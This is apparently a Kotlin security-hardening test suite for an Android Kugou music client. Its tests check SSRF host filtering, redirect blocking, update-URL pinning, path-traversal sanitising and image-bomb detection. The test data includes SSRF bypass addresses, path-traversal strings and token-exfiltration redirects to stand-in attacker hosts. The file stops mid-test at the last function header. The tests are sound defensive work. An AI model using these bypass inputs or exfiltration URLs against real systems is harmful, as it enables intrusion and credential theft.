package com.concept.music

import com.concept.music.data.kugou.DirectKugouTransport
import com.concept.music.data.kugou.KugouSession
import com.concept.music.data.kugou.KugouSigner
import com.concept.music.data.kugou.NetworkClientProvider
import com.concept.music.data.model.Song
import com.concept.music.data.share.KugouShareLinkParser
import com.concept.music.data.share.KugouShareManager
import com.concept.music.data.share.ParsedKugouShareDescriptor
import com.concept.music.service.MusicDownloadManager
import com.concept.music.ui.settings.UpdateCheckResult
import com.concept.music.ui.settings.UpdateProbeOutcome
import com.concept.music.ui.settings.evaluateUpdateProbeConsensus
import com.concept.music.ui.settings.resolveUpdateCheckFromApiOrRedirect
import com.concept.music.util.SecurityGuards
import okhttp3.Dns
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test
import java.io.ByteArrayInputStream
import java.io.File
import java.io.IOException
import java.net.InetAddress
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.file.Files

class SecurityHardeningTest {

    private fun locateRepoRoot(): File {
        val candidates = listOf(File("."), File(".."))
        return candidates.firstOrNull { File(it, "settings.gradle.kts").exists() }
            ?: error("无法定位项目根目录")
    }

    // -------------------------------------------------------------------------
    // 1. SSRF 与非公网主机/IP 边界防御测试
    // -------------------------------------------------------------------------

    @Test
    fun `isDisallowedNonPublicHost blocks loopback RFC1918 CGNAT metadata IPv6 and numeric IPv4 while allowing public hosts`() {
        // 阻断：空值、localhost、单标签主机、内网后缀
        assertTrue(SecurityGuards.isDisallowedNonPublicHost(""))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("   "))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("localhost"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("LOCALHOST."))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("api.localhost"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("nas.local"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("redis.internal"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("intranet-gateway"))

        // 阻断：IPv4 回环、未指定、RFC1918 私网、链路本地元数据、CGNAT、多播
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("0.0.0.0"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("127.0.0.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("127.255.255.254"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("10.0.0.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("172.16.0.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("172.31.255.255"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("192.168.1.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("169.254.169.254"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("100.64.0.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("100.127.255.255"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("224.0.0.1"))

        // 边界放行：紧邻 RFC1918 / CGNAT 边界的合法公网 IPv4
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("172.15.255.255"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("172.32.0.1"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("100.63.255.255"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("100.128.0.1"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("8.8.8.8"))

        // 阻断：十进制 / 十六进制变形 IPv4 绕过尝试
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("2130706433")) // 127.0.0.1
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("0x7f000001")) // 127.0.0.1

        // 阻断：IPv6 回环、链路本地、ULA 与 IPv4-mapped 私网地址
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[::1]"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("::1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[fe80::1]"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[fc00::1]"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[fd12:3456:789a::1]"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[::ffff:127.0.0.1]"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[::ffff:192.168.0.10]"))

        // 放行：合法公网 IPv6 与业务域名
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("[2606:4700:4700::1111]"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("gateway.kugou.com"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("t1.kugou.com"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("github.com"))
    }

    // -------------------------------------------------------------------------
    // 2. 分享链接解析器 SSRF 过滤与 302 恶意重定向阻断测试
    // -------------------------------------------------------------------------

    @Test
    fun `extractCandidateUrls rejects SSRF and spoofed domains while preserving legitimate Kugou share links`() {
        val mixedClipboard = """
            来看看这首歌 https://t1.kugou.com/abcDEF12
            伪造回环探测 http://127.0.0.1:8080/secret?domain=kugou.com
            伪造内网探测 http://192.168.1.1/router?ref=https://www.kugou.com
            伪造子串域名 https://evil-kugou.com/song/123
            伪造凭据注入 https://kugou.com@evil.example/share
            真短链 https://kgurl.cn/9XyZ
            应用宝唤端 https://a.app.qq.com/o/simple.jsp?pkgname=com.kugou.android
            原生唤醒 kugouyouth://start.weixin?data=%7B%22hash%22%3A%220123456789abcdef0123456789abcdef%22%7D
        """.trimIndent()

        val extracted = KugouShareLinkParser.extractCandidateUrls(mixedClipboard)
        assertEquals(
            listOf(
                "kugouyouth://start.weixin?data=%7B%22hash%22%3A%220123456789abcdef0123456789abcdef%22%7D",
                "https://t1.kugou.com/abcDEF12",
                "https://kgurl.cn/9XyZ",
                "https://a.app.qq.com/o/simple.jsp?pkgname=com.kugou.android"
            ),
            extracted
        )
    }

    @Test
    fun `resolveHttpShareUrl follows trusted Kugou redirects but aborts before requesting loopback or untrusted redirect targets`() {
        MockWebServer().use { kugouEntryServer ->
            MockWebServer().use { internalVictimServer ->
                internalVictimServer.enqueue(MockResponse().setResponseCode(200).setBody("TOP_SECRET_INTERNAL"))

                // 场景 A：合法的酷狗域内 302 跳转正常解析歌曲 Hash
                val expectedHash = "0123456789abcdef0123456789abcdef"
                kugouEntryServer.enqueue(
                    MockResponse()
                        .setResponseCode(302)
                        .addHeader(
                            "Location",
                            "http://m.kugou.com:${kugouEntryServer.port}/share/song.html?hash=$expectedHash"
                        )
                )

                val testDns = object : Dns {
                    override fun lookup(hostname: String): List<InetAddress> {
                        return if (hostname.endsWith("kugou.com")) {
                            listOf(InetAddress.getByName("127.0.0.1"))
                        } else {
                            Dns.SYSTEM.lookup(hostname)
                        }
                    }
                }
                val testClient = OkHttpClient.Builder().dns(testDns).build()

                val okDesc = KugouShareLinkParser.resolveHttpShareUrl(
                    startUrl = "http://t1.kugou.com:${kugouEntryServer.port}/shortOk",
                    userAgent = "TestUA",
                    clientOverrideForTest = testClient
                )
                assertTrue(okDesc is ParsedKugouShareDescriptor.SingleSongDescriptor)
                assertEquals(expectedHash.uppercase(), (okDesc as ParsedKugouShareDescriptor.SingleSongDescriptor).hash)

                // 场景 B：短链返回指向 127.0.0.1 内网端口的恶意 302 重定向 —— 必须立即熔断，绝不向内网目标发起请求
                kugouEntryServer.enqueue(
                    MockResponse()
                        .setResponseCode(302)
                        .addHeader("Location", "http://127.0.0.1:${internalVictimServer.port}/steal?kugou.com=1")
                )
                KugouShareLinkParser.resolveHttpShareUrl(
                    startUrl = "http://t1.kugou.com:${kugouEntryServer.port}/shortSsrfLoopback",
                    userAgent = "TestUA",
                    clientOverrideForTest = testClient
                )
                assertEquals("SSRF 回环重定向目标绝不能收到任何请求", 0, internalVictimServer.requestCount)

                // 场景 C：短链返回指向非酷狗第三方域名的 302 重定向 —— 同样必须熔断
                kugouEntryServer.enqueue(
                    MockResponse()
                        .setResponseCode(302)
                        .addHeader("Location", "https://attacker.example:${internalVictimServer.port}/phish")
                )
                KugouShareLinkParser.resolveHttpShareUrl(
                    startUrl = "http://t1.kugou.com:${kugouEntryServer.port}/shortCrossDomain",
                    userAgent = "TestUA",
                    clientOverrideForTest = testClient
                )
                assertEquals(0, internalVictimServer.requestCount)
            }
        }
    }

    // -------------------------------------------------------------------------
    // 3. 在线更新供应链 URL 钉扎与外部浏览器危险 Scheme 拦截测试
    // -------------------------------------------------------------------------

    @Test
    fun `resolveUpdateCheckFromApiOrRedirect pins tampered mirror download URLs to official GitHub repository`() {
        // 恶意镜像篡改 browser_download_url 为第三方木马站点
        val tamperedJson = """
            {
              "tag_name": "v9.9.9",
              "name": "BreezeMusic v9.9.9",
              "html_url": "https://evil-mirror.example/fake-release",
              "assets": [
                {
                  "name": "BreezeMusic-phone-v9.9.9.apk",
                  "browser_download_url": "https://evil-mirror.example/malware.apk"
                }
              ]
            }
        """.trimIndent()

        val tamperedResult = resolveUpdateCheckFromApiOrRedirect(
            localVersionName = "1.3.4",
            apiHttpCode = 200,
            apiBodyJson = tamperedJson
        )
        assertTrue(tamperedResult is UpdateCheckResult.HasUpdate)
        assertEquals(
            "https://github.com/reneryi7/BreezeMusic-Android/releases/tag/v9.9.9",
            (tamperedResult as UpdateCheckResult.HasUpdate).downloadUrl
        )

        // 篡改为 GitHub 上的其他攻击者仓库同样必须被拦截回退
        val wrongRepoJson = """
            {
              "tag_name": "v9.9.9",
              "html_url": "https://github.com/attacker/BreezeMusic-Android/releases/tag/v9.9.9",
              "assets": [
                {
                  "name": "BreezeMusic-phone-v9.9.9.apk",
                  "browser_download_url": "https://github.com/attacker/BreezeMusic-Android/releases/download/v9.9.9/BreezeMusic-phone.apk"
                }
              ]
            }
        """.trimIndent()
        val wrongRepoResult = resolveUpdateCheckFromApiOrRedirect(
            localVersionName = "1.3.4",
            apiHttpCode = 200,
            apiBodyJson = wrongRepoJson
        ) as UpdateCheckResult.HasUpdate
        assertEquals(
            "https://github.com/reneryi7/BreezeMusic-Android/releases/tag/v9.9.9",
            wrongRepoResult.downloadUrl
        )

        // 合法的本仓库官方 GitHub Release APK 下载地址应原样保留
        val officialApkUrl = "https://github.com/reneryi7/BreezeMusic-Android/releases/download/v9.9.9/BreezeMusic-phone-v9.9.9.apk"
        val legitimateJson = """
            {
              "tag_name": "v9.9.9",
              "html_url": "https://github.com/reneryi7/BreezeMusic-Android/releases/tag/v9.9.9",
              "assets": [
                {
                  "name": "BreezeMusic-phone-v9.9.9.apk",
                  "browser_download_url": "$officialApkUrl"
                }
              ]
            }
        """.trimIndent()
        val officialResult = resolveUpdateCheckFromApiOrRedirect(
            localVersionName = "1.3.4",
            apiHttpCode = 200,
            apiBodyJson = legitimateJson
        ) as UpdateCheckResult.HasUpdate
        assertEquals(officialApkUrl, officialResult.downloadUrl)
    }

    @Test
    fun `isSafeBrowserHttpUrl blocks intent javascript file content and private network URLs`() {
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl(""))
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl("javascript:alert(1)"))
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl("intent://scan/#Intent;scheme=zxing;package=com.attacker;end"))
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl("file:///data/data/com.concept.music/shared_prefs/secret.xml"))
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl("content://com.concept.music.provider/files/1"))
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl("http://127.0.0.1:8080/admin"))
        assertFalse(SecurityGuards.isSafeBrowserHttpUrl("https://user:pass@github.com/reneryi7/BreezeMusic-Android"))
        assertTrue(SecurityGuards.isSafeBrowserHttpUrl("https://github.com/reneryi7/BreezeMusic-Android/releases"))
    }

    // -------------------------------------------------------------------------
    // 4. 鉴权传输层强制 HTTPS 升级与敏感 Token 跨域/明文泄露阻断测试
    // -------------------------------------------------------------------------

    @Test
    fun `DirectKugouTransport upgrades sensitive endpoints to HTTPS gateway and disables cleartext fallback when credentialed`() {
        val session = KugouSession(userId = "10001", token = "secret_tok", vipToken = "vip_secret")

        // 携带登录态或手机号/密码密文时，login.user.kugou.com / userinfo.user.kugou.com 必须路由至 https://gateway.kugou.com
        assertEquals(
            "https://gateway.kugou.com",
            DirectKugouTransport.enforceHttpsForSensitiveHost("http://login.user.kugou.com", session, emptyMap())
        )
        assertEquals(
            "https://gateway.kugou.com",
            DirectKugouTransport.enforceHttpsForSensitiveHost("http://login.user.kugou.com", null, mapOf("mobile" to "13800138000"))
        )
        assertEquals(
            "https://gateway.kugou.com",
            DirectKugouTransport.enforceHttpsForSensitiveHost("http://login.user.kugou.com", null, mapOf("p3" to "enc_pwd"))
        )
        assertEquals(
            "https://gateway.kugou.com",
            DirectKugouTransport.enforceHttpsForSensitiveHost("http://userinfo.user.kugou.com", session, emptyMap())
        )
        assertEquals(
            "https://m.kugou.com",
            DirectKugouTransport.enforceHttpsForSensitiveHost("http://m.kugou.com", session, emptyMap())
        )

        // allowCleartextFallback = false 时绝不能生成任何 http:// 候选节点
        val secureEndpoints = DirectKugouTransport.buildCandidateEndpoints(
            rawHost = "http://login.user.kugou.com",
            baseHeaders = emptyMap(),
            allowCleartextFallback = false
        )
        assertTrue(secureEndpoints.isNotEmpty())
        assertTrue(secureEndpoints.all { it.first.startsWith("https://") })
        assertEquals("login.user.kugou.com", secureEndpoints.first().second["x-router"])
    }

    @Test
    fun `NetworkClientProvider interceptor aborts credentialed requests sent over non-loopback cleartext or non-Kugou domains`() {
        // 携带 token 查询参数发往第三方非酷狗域名时，应用层拦截器必须在 DNS/TCP 建连前直接抛 IOException 阻断泄露
        val crossDomainReq = Request.Builder()
            .url("https://attacker.invalid/collect?token=super_secret_token&userid=10001")
            .get()
            .build()
        try {
            NetworkClientProvider.baseClient.newCall(crossDomainReq).execute().close()
            fail("携带敏感 token 发往非酷狗域名的请求必须被拦截")
        } catch (e: IOException) {
            assertTrue(e.message.orEmpty().contains("已拦截携带登录凭证向外部非授信域名的跨域请求"))
        }

        // 携带 token 明文 HTTP 请求酷狗域名（非本地回环测试）必须在建连前被拦截
        val cleartextTokenReq = Request.Builder()
            .url("http://gateway.kugou.com/v5/url?token=super_secret_token")
            .get()
            .build()
        try {
            NetworkClientProvider.baseClient.newCall(cleartextTokenReq).execute().close()
            fail("携带敏感 token 的明文 HTTP 请求必须被拦截")
        } catch (e: IOException) {
            assertTrue(e.message.orEmpty().contains("已拦截携带登录凭证的明文 HTTP 请求"))
        }

        // 服务端返回恶意 302 重定向企图将 token 带往第三方非授信站点时，网络层拦截器必须在发送请求报文前熔断（受害端收到 0 个 HTTP 请求）
        MockWebServer().use { originServer ->
            MockWebServer().use { attackerServer ->
                originServer.enqueue(
                    MockResponse()
                        .setResponseCode(302)
                        .addHeader("Location", "http://evil.example:${attackerServer.port}/capture?token=super_secret_token")
                )
                val redirectTestClient = NetworkClientProvider.baseClient.newBuilder()
                    .dns(object : Dns {
                        override fun lookup(hostname: String): List<InetAddress> {
                            return listOf(InetAddress.getByName("127.0.0.1"))
                        }
                    })
                    .build()
                val req = Request.Builder()
                    .url("http://127.0.0.1:${originServer.port}/api?token=super_secret_token")
                    .get()
                    .build()
                try {
                    redirectTestClient.newCall(req).execute().close()
                    fail("302 重定向携带 token 跳往外部站点必须被网络层拦截器阻断")
                } catch (e: IOException) {
                    assertTrue(e.message.orEmpty().contains("已拦截携带登录凭证"))
                }
                assertEquals("攻击者服务器绝不能收到携带 token 的重定向请求报文", 0, attackerServer.requestCount)
            }
        }
    }

    // -------------------------------------------------------------------------
    // 5. 路径穿越与沙盒逃逸防御测试 (MusicDownloadManager & SecurityGuards)
    // -------------------------------------------------------------------------

    @Test
    fun `sanitizeSafeExportDirectoryPath and MusicDownloadManager block path traversal and sandbox directories`() {
        val defaultAudio = MusicDownloadManager.DEFAULT_AUDIO_DOWNLOAD_PATH
        val appSandbox = "/data/user/0/com.concept.music"

        assertEquals(
            defaultAudio,
            SecurityGuards.sanitizeSafeExportDirectoryPath(
                "/storage/emulated/0/Music/../../../data/data/com.concept.music/shared_prefs",
                defaultAudio,
                appSandbox
            )
        )
        assertEquals(
            defaultAudio,
            SecurityGuards.sanitizeSafeExportDirectoryPath(
                "/data/user/0/com.concept.music/files",
                defaultAudio,
                appSandbox
            )
        )
        assertEquals(
            defaultAudio,
            SecurityGuards.sanitizeSafeExportDirectoryPath("/proc/self/fd", defaultAudio, appSandbox)
        )
        assertEquals(
            defaultAudio,
            SecurityGuards.sanitizeSafeExportDirectoryPath("/system/etc", defaultAudio, appSandbox)
        )
        assertEquals(
            defaultAudio,
            SecurityGuards.sanitizeSafeExportDirectoryPath("relative/path/only", defaultAudio, appSandbox)
        )
        assertEquals(
            defaultAudio,
            SecurityGuards.sanitizeSafeExportDirectoryPath("/storage/emulated/0/Music/bad\u0000dir", defaultAudio, appSandbox)
        )
        assertEquals(
            "/storage/emulated/0/Music/Lossless",
            SecurityGuards.sanitizeSafeExportDirectoryPath("/storage/emulated/0/Music/Lossless/", defaultAudio, appSandbox)
        )

        // 验证 MusicDownloadManager setter 同步拦截
        MusicDownloadManager.setDownloadDirectoryPath("/storage/emulated/0/Music/../../data/data/com.concept.music")
        assertEquals(defaultAudio, MusicDownloadManager.config.value.downloadDirectoryPath)

        // 验证 MediaStore RELATIVE_PATH 防穿越
        assertEquals(
            "Music/BreezeMusic",
            MusicDownloadManager.resolveMediaStoreRelativePath(
                "/storage/emulated/0/Music/../../Android/data/com.other.app",
                isAudio = true
            )
        )
        assertEquals(
            "Download/BreezeMusic/Lyrics",
            MusicDownloadManager.resolveMediaStoreRelativePath(
                "/storage/emulated/0/data/local/tmp",
                isAudio = false
            )
        )
        assertEquals(
            "Music/HiResAlbums",
            MusicDownloadManager.resolveMediaStoreRelativePath(
                "/storage/emulated/0/HiResAlbums",
                isAudio = true
            )
        )
    }

    @Test
    fun `resolveSafeChildFile and sanitizeStagingToken neutralize slash and dot-dot escapes`() {
        val tempParent = Files.createTempDirectory("breeze_sec_test").toFile()
        try {
            val resolved = SecurityGuards.resolveSafeChildFile(tempParent, "../../shared_prefs/pwn.mp3")
            val resolvedParent = resolved.parentFile
            assertNotNull(resolvedParent)
            assertEquals(tempParent.canonicalFile, resolvedParent!!.canonicalFile)
            assertFalse(resolved.name.contains("/"))
            assertFalse(resolved.name.contains("\\"))

            val dotDotResolved = SecurityGuards.resolveSafeChildFile(tempParent, "..")
            assertEquals("_track_", dotDotResolved.name)

            val safeToken = SecurityGuards.sanitizeStagingToken("../../cache/evil_id\u0000")
            assertFalse(safeToken.contains(".."))
            assertFalse(safeToken.contains("/"))
            assertTrue(safeToken.isNotBlank())
        } finally {
            tempParent.deleteRecursively()
        }
    }

    // -------------------------------------------------------------------------
    // 6. 流式大小上限 OOM 防护与图像解压炸弹 (Image Bomb) 检测测试
    // -------------------------------------------------------------------------

    @Test
    fun `readBoundedBytes enforces exact byte ceiling for both Content-Length and chunked streams`() {
        // 空流正常返回空数组
        val empty = SecurityGuards.readBoundedBytes(ByteArrayInputStream(ByteArray(0)), maxBytes = 64)
        assertEquals(0, empty.size)

        // 精确等于上限边界 (64 bytes) 正常通过
        val exactPayload = ByteArray(64) { (it and 0xFF).toByte() }
        val exactRead = SecurityGuards.readBoundedBytes(
            ByteArrayInputStream(exactPayload),
            maxBytes = 64,
            declaredContentLength = 64L
        )
        assertArrayEquals(exactPayload, exactRead)

        // Content-Length 超限立即抛 IOException
        try {
            SecurityGuards.readBoundedBytes(
                ByteArrayInputStream(exactPayload),
                maxBytes = 64,
                declaredContentLength = 65L
            )
            fail("超出 Content-Length 上限应抛出 IOException")
        } catch (_: IOException) {
            // expected
        }

        // Chunked 未知长度 (declaredContentLength = -1) 实际输出 65 字节超限时抛 IOException
        val overPayload = ByteArray(65) { 0x41 }
        try {
            SecurityGuards.readBoundedBytes(
                ByteArrayInputStream(overPayload),
                maxBytes = 64,
                declaredContentLength = -1L
            )
            fail("Chunked 响应流超出字节上限应抛出 IOException")
        } catch (_: IOException) {
            // expected
        }
    }

    @Test
    fun `peekImageDimensions and isSafeImagePayload reject 65535x65535 PNG decompression bombs`() {
        fun buildPngHeader(width: Int, height: Int): ByteArray {
            val buf = ByteBuffer.allocate(32).order(ByteOrder.BIG_ENDIAN)
            buf.put(byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A))
            buf.putInt(13) // IHDR length
            buf.put("IHDR".toByteArray(Charsets.US_ASCII))
            buf.putInt(width)
            buf.putInt(height)
            buf.put(byteArrayOf(8, 6, 0, 0, 0))
            return buf.array()
        }

        val normalPng = buildPngHeader(1000, 1000)
        assertEquals(1000 to 1000, SecurityGuards.peekImageDimensions(normalPng))
        assertTrue(SecurityGuards.isSafeImagePayload(normalPng))

        // 仅 32 字节却声明 65535 x 65535 像素（解码需 ~17 GB RAM）的 PNG 炸弹必须被拦截
        val bombPng = buildPngHeader(65535, 65535)
        assertEquals(65535 to 65535, SecurityGuards.peekImageDimensions(bombPng))
        assertFalse(SecurityGuards.isSafeImagePayload(bombPng))

        // 单边超限 (9000 x 100) 同样拦截
        val wideBombPng = buildPngHeader(9000, 100)
        assertFalse(SecurityGuards.isSafeImagePayload(wideBombPng))
    }

    // -------------------------------------------------------------------------
    // 7. 密码学 CSPRNG 加解密与常量时间 IPC 令牌鉴权测试
    // -------------------------------------------------------------------------

    @Test
    fun `KugouSigner playlistAesEncrypt uses unpredictable CSPRNG keys and round-trips cleanly`() {
        val plain = """{"userid":"10001","token":"secret_payload"}"""
        val samples = (1..5).map { KugouSigner.playlistAesEncrypt(plain) }
        assertTrue("CSPRNG 多次加密应生成不同随机密钥种子", samples.map { it.first }.toSet().size > 1)
        samples.forEach { (key, base64Cipher) ->
            assertEquals(plain, KugouSigner.playlistAesDecrypt(key = key, base64Cipher = base64Cipher))
        }
    }

    @Test
    fun `verifyInternalIpcTokenValue enforces constant-time exact token match`() {
        val generatedToken = SecurityGuards.getOrCreateInternalIpcToken(null)
        assertEquals(64, generatedToken.length)
        assertTrue(SecurityGuards.verifyInternalIpcTokenValue(null, generatedToken))
        assertFalse(SecurityGuards.verifyInternalIpcTokenValue(null, null))
        assertFalse(SecurityGuards.verifyInternalIpcTokenValue(null, ""))
        assertFalse(SecurityGuards.verifyInternalIpcTokenValue(null, "short"))

        val validToken = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
        assertTrue(SecurityGuards.verifyTokenConstantTime(validToken, validToken))
        assertFalse(SecurityGuards.verifyTokenConstantTime(validToken, ""))
        assertFalse(
            SecurityGuards.verifyTokenConstantTime(
                validToken,
                "b1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
            )
        )
    }

    // -------------------------------------------------------------------------
    // 8. 构建配置与网络安全策略静态合规回归断言
    // -------------------------------------------------------------------------

    @Test
    fun `build script manifest backup rules and verification CSP enforce strict security posture without hardcoded secrets`() {
        val root = locateRepoRoot()
        val gradleText = File(root, "app/build.gradle.kts").readText(Charsets.UTF_8)
        val hardcodedPasswordAssignment = Regex("""(?:storePassword|keyPassword)\s*=\s*"[^"]*"""")
        assertFalse(
            "build.gradle.kts 严禁出现任何字符串字面量形式的签名口令赋值",
            hardcodedPasswordAssignment.containsMatchIn(gradleText)
        )

        val gitignoreText = File(root, ".gitignore").readText(Charsets.UTF_8)
        assertFalse(".gitignore 严禁豁免提交 *.jks 私钥文件", gitignoreText.contains("!app/keystore/*.jks"))
        assertTrue(".gitignore 应忽略 keystore.properties", gitignoreText.contains("keystore.properties"))

        val netSecXml = File(root, "app/src/main/res/xml/network_security_config.xml").readText(Charsets.UTF_8)
        for (mustProtectDomain in listOf(
            "gateway.kugou.com",
            "user.kugou.com",
            "login.user.kugou.com",
            "userinfo.user.kugou.com",
            "d.kugou.com",
            "github.com",
            "githubusercontent.com",
            "ghfast.top",
            "gh-proxy.com",
            "qq.com"
        )) {
            assertTrue("network_security_config.xml 必须包含受保护域名 $mustProtectDomain", netSecXml.contains(mustProtectDomain))
        }

        // Android 12+ (targetSdk=34) D2D / 云备份防提取规则校验
        val manifestXml = File(root, "app/src/main/AndroidManifest.xml").readText(Charsets.UTF_8)
        assertTrue(manifestXml.contains("""android:allowBackup="false""""))
        assertTrue(manifestXml.contains("""android:dataExtractionRules="@xml/data_extraction_rules""""))
        assertTrue(manifestXml.contains("""android:fullBackupContent="@xml/backup_rules""""))

        val extractionXml = File(root, "app/src/main/res/xml/data_extraction_rules.xml").readText(Charsets.UTF_8)
        assertTrue(extractionXml.contains("<cloud-backup>"))
        assertTrue(extractionXml.contains("<device-transfer>"))
        assertTrue(extractionXml.contains("""<exclude domain="sharedpref" path="." />"""))

        // WebView 腾讯滑块验证 CSP 与 Referrer-Policy 合规校验
        val verificationHtml = File(root, "app/src/main/assets/verification/index.html").readText(Charsets.UTF_8)
        assertTrue(verificationHtml.contains("""name="referrer" content="strict-origin-when-cross-origin""""))
        assertTrue(verificationHtml.contains("form-action 'none'"))
        assertTrue(verificationHtml.contains("worker-src 'self' blob:"))
        assertTrue(verificationHtml.contains("style-src 'self' 'unsafe-inline' https://*.qcloud.com https://*.gtimg.com"))
    }

    // -------------------------------------------------------------------------
    // 9. 深度审计新增回归测试（IPv6 凭据泄漏阻断、八进制/NAT64/6to4 SSRF、供应链多镜像共识、预建连 302 熔断、VP8/BMP 炸弹）
    // -------------------------------------------------------------------------

    @Test
    fun `enforceCredentialTransportSafety blocks public IPv6 cleartext and cross-domain leaks and case-insensitive tokens`() {
        // 1. 公网 IPv6 明文 HTTP 携带 token 必须被拦截（修复前因 !host.contains('.') 误判为 loopback 而漏放）
        val ipv6CleartextReq = Request.Builder()
            .url("http://[2606:4700:4700::1111]/api?token=secret_user_token")
            .build()
        try {
            NetworkClientProvider.enforceCredentialTransportSafety(ipv6CleartextReq)
            fail("应当拦截发往公网 IPv6 地址的明文凭据请求")
        } catch (expected: IOException) {
            assertTrue(expected.message.orEmpty().contains("明文 HTTP"))
        }

        // 2. 公网 IPv6 HTTPS 非酷狗授信域同样必须拦截跨域凭据泄露
        val ipv6CrossDomainHttpsReq = Request.Builder()
            .url("https://[2606:4700:4700::1111]/collect?token=secret_user_token")
            .build()
        try {
            NetworkClientProvider.enforceCredentialTransportSafety(ipv6CrossDomainHttpsReq)
            fail("应当拦截发往非授信公网 IPv6 主机的跨域凭据请求")
        } catch (expected: IOException) {
            assertTrue(expected.message.orEmpty().contains("非授信域名"))
        }

        // 3. 大小写混淆参数名 (?Token=...)、手机号验证码 (?mobile=...&code=...) 与 Cookie 头跨域请求均须被拦截
        for (unsafeUrl in listOf(
            "http://gateway.kugou.com/v5/login?Token=mixed_case_secret",
            "https://evil-collector.example/steal?VIP_TOKEN=vip_secret",
            "http://gateway.kugou.com/v2/send_sms?mobile=13800138000&code=123456"
        )) {
            try {
                NetworkClientProvider.enforceCredentialTransportSafety(Request.Builder().url(unsafeUrl).build())
                fail("应当拦截不安全凭据请求: $unsafeUrl")
            } catch (_: IOException) {
                // expected
            }
        }

        val cookieLeakReq = Request.Builder()
            .url("https://evil-collector.example/track")
            .header("Cookie", "KugouToken=secret_cookie")
            .build()
        try {
            NetworkClientProvider.enforceCredentialTransportSafety(cookieLeakReq)
            fail("应当拦截携带 Cookie 发往外部非授信域名的请求")
        } catch (_: IOException) {
            // expected
        }
    }

    @Test
    fun `isDisallowedNonPublicHost blocks octal IPv4 and NAT64 6to4 Teredo IPv6 bypasses`() {
        // 八进制变形回环与私网 IPv4（修复前被点分十进制快速路径误当作 177.0.0.1 / 12.0.0.1 放行）
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("0177.0.0.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("127.0.0.01"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("012.0.0.1"))
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("0300.0250.0.1"))

        // NAT64 嵌入回环/元数据/私网 IPv4、RFC8215 本地 NAT64、6to4 嵌入回环/私网、Teredo 隧道与 ZoneID
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[64:ff9b::7f00:1]")) // NAT64 -> 127.0.0.1
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[64:ff9b::a9fe:a9fe]")) // NAT64 -> 169.254.169.254
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[64:ff9b:1::1]")) // Local-use NAT64
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[2002:7f00:0001::1]")) // 6to4 -> 127.0.0.1
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[2002:c0a8:0101::1]")) // 6to4 -> 192.168.1.1
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("[2001:0000:4136:e378:8000:63bf:3fff:fdd2]")) // Teredo
        assertTrue(SecurityGuards.isDisallowedNonPublicHost("fe80::1%eth0"))

        // 合法公网 IPv6 与嵌入公网 8.8.8.8 的标准 NAT64 仍正常放行
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("[2606:4700:4700::1111]"))
        assertFalse(SecurityGuards.isDisallowedNonPublicHost("[64:ff9b::0808:0808]"))
    }

    @Test
    fun `sanitizeUpdateDownloadUrl rejects multi-tenant githubusercontent assets and evaluateUpdateProbeConsensus prevents single-mirror poisoning`() {
